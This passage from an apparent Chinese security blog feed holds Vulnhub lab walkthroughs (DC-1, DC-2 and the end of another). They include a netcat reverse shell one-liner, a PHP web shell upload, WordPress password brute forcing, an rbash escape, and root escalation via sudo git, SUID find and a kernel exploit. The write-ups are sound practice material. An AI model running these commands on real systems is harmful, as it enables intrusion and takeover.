alt="image-20220605041557479"></p><h4 id="传马">传马</h4><ul><li>然后进入前面找到的后台管理地址，发现该网站可以上传一句话木🐎，那就传，然后用蚁剑连接</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605043121693.png" alt="image-20220605043121693"></p><ul><li>随便点一个</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605043207589.png" alt="image-20220605043207589"></p><ul><li>新建一个php文件用来传马</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605043329807.png" alt="image-20220605043329807"></p><ul><li>找到新建的php文件并写入马的内容，并保存</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605043532371.png" alt="image-20220605043532371"></p><h4 id="蚁剑连接">蚁剑连接</h4><ul><li>打开蚁剑连接</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605044206406.png" alt="image-20220605044206406"></p><h4 id="反弹shell">反弹shell</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.207.129 443 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605051113753.png" alt="image-20220605051113753"></p><h4 id="漏洞利用">漏洞利用</h4><ul><li>用命令uname -a查看内核版本，经过百度对应的是Ubuntu 16.04</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605051135777.png" alt="image-20220605051135777"></p><ul><li>再次利用searchsploit查找有关Ubuntu 16.04的漏洞</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605045904252.png" alt="image-20220605045904252"></p><ul><li>打开文件并查看漏洞利用方法</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605050130615.png" alt="image-20220605050130615"></p><ul><li>下载exp到靶机上，并解压</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605052037421.png" alt=""></p><blockquote><p>解压后依次进入39772文件夹</p><p>再解压exploit.tar，然后再进入ebpf_mapfd_doubleput_exploit，并运行./compile.sh，然后再运行./doubleput</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605052434258.png" alt="image-20220605052434258"></p><ul><li>然后在进到root目录，就看到了flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605052534589.png" alt="image-20220605052534589"></p><ul><li>最后再cat一下就得到flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605052605567.png" alt="image-20220605052605567"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2复现</title>
      <link href="/posts/54062/"/>
      <url>/posts/54062/</url>
      
        <content type="html"><![CDATA[<h1>DC-2复现</h1><h2 id="描述">描述</h2><blockquote><p>与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</p><p>与最初的 DC-1 一样，它的设计考虑到了初学者。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>就像 DC-1 一样，有五个标志，包括最终标志。</p><p>再说一次，就像 DC-1 一样，标志对初学者很重要，但对有经验的人来说并不那么重要。</p><p>简而言之，唯一真正重要的标志是最终标志。</p><p>对于初学者来说，谷歌是你的朋友。好吧，除了所有的隐私问题等等等等。</p><p>我还没有探索实现 root 的所有方法，因为我放弃了我一直在研究的以前的版本，并从基本操作系统安装之外完全重新开始。</p></blockquote><h2 id="开始">开始</h2><h3 id="Flag1">Flag1:</h3><ul><li>使用nmap扫C段，得到目标IP：192.168.207.137</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1654348280925-a2c8411d-30cd-48a8-a321-0768f48403a1.png" alt="img"></p><ul><li>得到ip我们就开一下都开启了哪些端口</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1654348336822-35c2b2e5-e08c-4c97-846e-d5ce1859fb39.png" alt="img"></p><ul><li>开启了80和7744端口，我们先从80端口入手，直接用浏览器访问192.168.207.137:80</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1654348955430-8fe2c8a3-6388-4575-91de-0617ed1a33dc.png" alt="img"></p><ul><li>访问之后跳到了<code>http://dc-2/</code>，但是访问不成功，根据之前扫出来的结果也得知，这是dns没被解析，那就手动去添加hosts地址</li><li>kali的hosts文件在<code>etc/</code>下</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1654349376987-138156b7-688d-44f0-9eea-b1e9b23ddc31.png" alt="img"></p><ul><li>修改好之后，直接进到</li></ul><blockquote><p>Flag1:</p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>More passwords is always better, but sometimes you just can’t win them all.</p><p>Log in as one to see the next flag.</p><p>If you can’t find it, log in as another.</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604215708275.png" alt="image-20220604215708275"></p><h3 id="Flag2">Flag2:</h3><ul><li>根据翻译提示，接下来需要我们进行密码的爆破，那么我们需要一个密码字典，然后翻译中还有一个词<code>cewl</code>这是kali自带的一个字典生成工具</li></ul><p><code>cewl http://dc-2/ -w dc-2.txt    #生成字典</code></p><ul><li>得到有238个关键词的字典</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604220502248.png" alt="image-20220604220502248"></p><ul><li><p>我们在访问<code>http://dc-2/</code>的时候发现网站是由wordpress搭建的，kali中带有的wpscan是一款免费的、用于非商业用途的黑盒 WordPress 安全扫描器。</p></li><li><p>我们就直接使用工具扫描网站</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604225232357.png" alt="image-20220604225232357"></p></li><li><p>然后发现了admin、jerry、tom三个用户名，</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604224440952.png" alt="image-20220604224440952"></p><ul><li>利用这三个用户名和之前爬下来的字典进行爆破</li></ul><p><code>wpscan --url http://dc-2/ -U user.txt -P dc-2.txt</code></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604225340060.png" alt="image-20220604225340060"></p><ul><li>爆出了jerry和tom的密码；</li></ul><blockquote><p>用户名/密码</p><p>jerry / adipiscing</p><p>tom / parturient</p></blockquote><ul><li>wordpress是有后台管理网站的，我们上网查到一般都是在url后面加/wp-login.php</li><li>随便一个账户登录进去后，在Pages中找到了flag2</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604225805888.png" alt="image-20220604225805888"></p><blockquote><p>Flag 2:</p><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604225924615.png" alt="image-20220604225924615"></p><ul><li>到这也就宣布80端口已经没有了利用的价值，得另寻他路才能找到后续的flag，我们前面扫到的7744端口还没有用到，那么接下来就能用上了</li></ul><h3 id="Flag3">Flag3:</h3><ul><li>经过几次尝试只有tom的账号能连上</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604230423791.png" alt="image-20220604230423791"></p><ul><li>登录成功后发现当前目录下就有flag3，但是cat并不能用，而vi能用，我们就直接看到了flag3的内容</li></ul><blockquote><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604230712815.png" alt="image-20220604230712815"></p><h3 id="Flag4">Flag4:</h3><ul><li>flag3将线索指向了jerry，也就意味着需要切换用户，然而并没有这么简单，根据提示，这是要绕过rbash</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604230900598.png" alt="image-20220604230900598"></p><ul><li>通过指令发现当前只有4个命令可用</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604231121563.png" alt="image-20220604231121563"></p><ul><li>通过百度得知了绕过的方法：即我们获取到的shell为：Restricted shell(受限制的shell)，可以添加环境变量来绕过</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#绕过rbash</span><br><span class="line"></span><br><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#添加环境变量</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604231349157.png" alt="image-20220604231349157"></p><ul><li>输入密码后也成功的切换到jerry的账号，并找到了flag4</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604231537492.png" alt="image-20220604231537492"></p><blockquote><p>Good to see that you’ve made it this far - but you’re not home yet.</p><p>You still need to get the final flag (the only flag that really counts!!!).</p><p>No hints here - you’re on your own now.  :-)</p><p>Go on - git outta here!!!</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604231629358.png" alt="image-20220604231629358"></p><h3 id="Flag5">Flag5:</h3><ul><li><p>通过flag4得知可利用git提权</p></li><li><p>又发现jerry可以以root用户的身份执行git命令而且还不需要密码</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604232739815.png" alt="image-20220604232739815"></p><ul><li>通过百度找到了两种提权方法</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">方法1：</span><br><span class="line"></span><br><span class="line">sudo git -p help #强制进入交互状态</span><br><span class="line"></span><br><span class="line">!/bin/bash #打开一个用户为root的shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法2：</span><br><span class="line"></span><br><span class="line">sudo git help config #在末行命令模式输入</span><br><span class="line"></span><br><span class="line">!/bin/bash 或者 !&#x27;sh&#x27; #打开一个用户为root的shell</span><br></pre></td></tr></table></figure><ul><li>成功提权后进到根目录下就找到了最后的flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220604233008680.png" alt="image-20220604233008680"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1复现</title>
      <link href="/posts/54045/"/>
      <url>/posts/54045/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-1复现">DC-1复现</h2><h2 id="描述">描述</h2><blockquote><p>DC-1 是一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>它旨在为初学者带来挑战，但它的简单程度取决于您的技能和知识以及您的学习能力。</p><p>要成功完成这一挑战，您将需要 Linux 技能、熟悉 Linux 命令行以及使用基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。</p><p>有多种获得 root 的方法，但是，我已经包含了一些包含初学者线索的标志。</p><p>总共有五个标志，但最终目标是在 root 的主目录中找到并读取标志。您甚至不需要成为 root 即可执行此操作，但是，您将需要 root 权限。</p><p>根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获取根。</p><p>初学者可能会遇到他们以前从未遇到过的挑战，但谷歌搜索应该是获取完成这一挑战所需信息的全部内容。</p></blockquote><h2 id="开始">开始</h2><h3 id="1-利用nmap收集有用信息">1.利用nmap收集有用信息</h3><ul><li><p>确定DC-1的ip为<strong>192.168.207.136</strong></p></li><li><p>使用命令</p></li></ul><p><code>nmap -sT 192.168.207.136</code></p><ul><li>扫描靶机开了哪些端口</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1.png" alt="1"></p><ul><li>发现该靶机开放了<em>ssh</em>服务和<em>http</em>服务</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220523202935501.png" alt="image-20220523202935501"></p><ul><li>访问网址后看到有登录框尝试弱口令并没有成功，其中该网站的CMS是Drupal</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/GE9%7D52_4%5BMR%7BCSE%5DN%7BV$D78.png" alt="img"></p><h3 id="2-使用msf查找Drupal可利用的漏洞">2.使用msf查找Drupal可利用的漏洞</h3><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/QQ%E5%9B%BE%E7%89%8720220523203527.png" alt="QQ图片20220523203527"></p><ul><li>有7个，从上往下试，试到第二个的时候就成了</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/L%5BZ1WDEH%7B%7D9TI%60~L%5BI%5B~EUV.png" alt="img"></p><ul><li>进入shell里发现了<em>flag1.txt</em>，提示去找配置文件</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/UGOD7XAP0$SVTSCL4DNPGQF.png" alt="img"></p><blockquote><p><strong>flag1：</strong></p><p><strong>Every goog CMS needs a config file - and so do you.</strong></p></blockquote><ul><li><p>通过百度知道<strong>drupal</strong>的配置文件是在*/var/www/sites/default*下，那我们直接进到目录下 <em>cat settings.php</em></p></li><li><p>在浏览配置文件得过程中发现了<strong>flag2</strong>，是关于数据库的登录信息</p></li></ul><p><strong>flag2：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">$databases <span class="operator">=</span> <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="3-登录MySQL和python及php脚本二点使用">3.登录MySQL和python及php脚本二点使用</h3><ul><li>用户名是：<strong>dbuser</strong>；密码是<strong>R0ck3t</strong></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/QQ%E5%9B%BE%E7%89%8720220523203734.png" alt="QQ图片20220523203734"></p><ul><li>直接使用<strong>MySQL</strong>命令时失效了；进到<em>shell</em>里使用命令也没有反应</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/ea3277f1-fe50-40cb-9614-21ee8e6b0261.png" alt="ea3277f1-fe50-40cb-9614-21ee8e6b0261"></p><ul><li>在使用<em>python -V</em>的命令时，发现靶机安装了python 2.7.3版本，那么使用python一句话命令获取标准<em>shell</em></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.mysql -udbuser -pR0ck3t  #连接数据库</span><br><span class="line">2.show databases;       #显示数据库列表</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/QQ%E5%9B%BE%E7%89%8720220523203937.png" alt="QQ图片20220523203937"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/13~%60Y$J55MDZ_%60%7BJ8NQ%5B%5D68.png" alt="13~{J8NQ[]68"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.use drupaldb;#使用drupal数据库</span><br><span class="line">2.show tables;#显示库中的数据表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| history                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.select * from users;#获取users的内容</span><br><span class="line">2.name：admin |pass： $S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY</span><br></pre></td></tr></table></figure><ul><li>经过网上搜索知道了在<strong>drupal7</strong>的安装目录中的<em>scripts</em>下，有一些开发者写好的PHP脚本，可以执行一些操作；</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/29b907c4-753f-4b59-83b0-83abd0515151.png" alt="29b907c4-753f-4b59-83b0-83abd0515151"></p><ul><li>我们这次利用的脚本的名称是：<strong><a href="http://password-hash.sh">password-hash.sh</a>；</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh <span class="string">&#x27;123456&#x27;</span>&gt;new_paswd.txt<span class="comment">#把admin的密码改成123456并储存在new_passwd.txt中</span></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/f0306074-0e74-4e83-9d36-2b96e9cbec68.png" alt="f0306074-0e74-4e83-9d36-2b96e9cbec68"></p><ul><li>那我们就可以直接拿着账号密码登录最开始访问的那个网站，在<strong>dashboard</strong>和<strong>content</strong>中都可以找到<strong>flag3</strong></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/b9a9963f-b64d-4de1-8bfc-89e1bf6a3163.png" alt="b9a9963f-b64d-4de1-8bfc-89e1bf6a3163"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/86b6342b-920c-4f84-b161-6eb4cc02445e.png" alt="86b6342b-920c-4f84-b161-6eb4cc02445e"></p><blockquote><p><strong>flag3：</strong></p><p><strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong></p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/c838d46f-3446-4dd6-96cd-80298e282a22.png" alt="c838d46f-3446-4dd6-96cd-80298e282a22"></p><ul><li>flag3中有几个关键词：perms、find、-exec、shadow</li></ul><h3 id="4-误打误撞发现了flag4">4.误打误撞发现了flag4</h3><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/15bc44cf-40b8-48e8-bcf4-744501d9026b.png" alt="15bc44cf-40b8-48e8-bcf4-744501d9026b"></p><blockquote><p><strong>flag4：</strong></p><p><strong>Can you use this same method to find or access the flag in root?</strong></p><p><strong>Probably. But perhaps it’s not that easy.  Or maybe it is?</strong></p></blockquote><h3 id="5-提权">5.提权</h3><ul><li>根据提示进到根目录下，但是提示没有权限</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/6d9b80a3-a0bc-441f-84ea-ce8497f7fb1e.png" alt="6d9b80a3-a0bc-441f-84ea-ce8497f7fb1e"></p><ul><li><p>此时，我们想到flag3中提到的几个关键词，我们可以利用一些方法进行提权</p></li><li><p>以下命令可以查看当前系统上运行的所有SUID可执行文件</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><ul><li>看到有find命令</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/0a647e18-e436-4936-9972-7e6ea1c250e6.png" alt="0a647e18-e436-4936-9972-7e6ea1c250e6"></p><ul><li>利用命令提权</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find root -exec &#x27;/bin/sh&#x27; \；</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/88c75a97-b9e6-4b1a-a408-a014dae31e69.png" alt="88c75a97-b9e6-4b1a-a408-a014dae31e69"></p><ul><li>进到根目录下找到最后的flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/b937d42a-7535-4c8b-8c4e-8d2948b33f56.png" alt="b937d42a-7535-4c8b-8c4e-8d2948b33f56"></p><p><strong>flag5：</strong></p><blockquote><p><strong>Well done!!!</strong></p><p><strong>Hopefully you’ve enjoyed this and learned some new skills.</strong></p><p><strong>You can let me know what you thought of this little journey</strong><br><strong>by contacting me via Twitter -</strong> <a href=""><strong>@DCAU7</strong> </a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu题解</title>
      <link href="/posts/5168/"/>
      <url>/posts/5168/</url>
      
